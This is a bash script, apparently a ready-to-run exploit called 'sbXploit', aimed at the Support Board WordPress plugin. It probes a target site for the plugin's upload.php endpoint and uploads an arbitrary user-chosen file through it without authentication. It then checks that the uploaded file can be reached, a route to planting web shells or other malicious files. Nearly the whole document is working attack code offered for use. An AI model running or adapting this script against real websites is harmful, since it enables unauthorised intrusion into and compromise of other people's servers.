#!/bin/bash
# ref @ https://cxsecurity.com/issue/WLB-2022030003

RED="$(printf '\033[1;31m')"  GREEN="$(printf '\033[1;32m')" PURPLE="$(printf '\033[1;35m')" RESAT="$(printf '\033[0m')"
cat << EOF
${PURPLE}    ___   ___   _ ${RED}  _    ${GREEN}  _     _     _
${PURPLE}   | |_) | |_) / |${RED} \ \  /${GREEN} | | | | |   | |\ |
${PURPLE}   |_|   |_| \ |_|${RED}  \_\/ ${GREEN} \_\_/ |_|__ |_| \|  ${RESAT}1337r0j4n

EOF

if [[ $1 == "" ]]; then
    echo -e " Usage: bash sbxploit.sh http://target.com/"
    exit 1
fi

echo -e " [${GREEN}sbXploit${RESAT}] Enter file name that u wanna upload"
read -p " [${GREEN}name.txt${RESAT}] " file

if [[ ! -f $file ]]; then
    echo -e "[${GREEN}sbXploit${RESAT}] ${RED}$file${RESAT} wasn't exist, pls make sure"
fi

target="$1"
get_exploitable_path() {

    vuln_path=("/wp-content/plugins/supportboard/supportboard/include/upload.php" "/supportboard/include/upload.php")
    for path in ${vuln_path[@]}; do
        check_vuln=$(curl -X GET -s -k $target/${path} | grep -o "Support Board Error")
            if [[ $check_vuln != "" ]];then
                echo $path
            else
                printf ''
            fi
    done

}

exploitable_path="$(get_exploitable_path)"

if [[ $(echo $exploitable_path) != "" ]]; then
    exploit=$(curl -X POST -s -k -F "file=@$file" $target/$exploitable_path | sed 's/\\//g' | cut -d '"' -f 4)
        if [[ $(curl -s -o /dev/null -w "%{http_code}" $exploit) == "200" ]]; then
            echo -e " [${GREEN}sbXploit${RESAT}] $exploit"
        else
            echo -e " [${RED}sbXploit${RESAT}] exploit complete, but no file couldn't upload :("
        fi
else
    echo -e " [${RED}sbXploit${RESAT}] $target didn't see to be exploitable"
fi
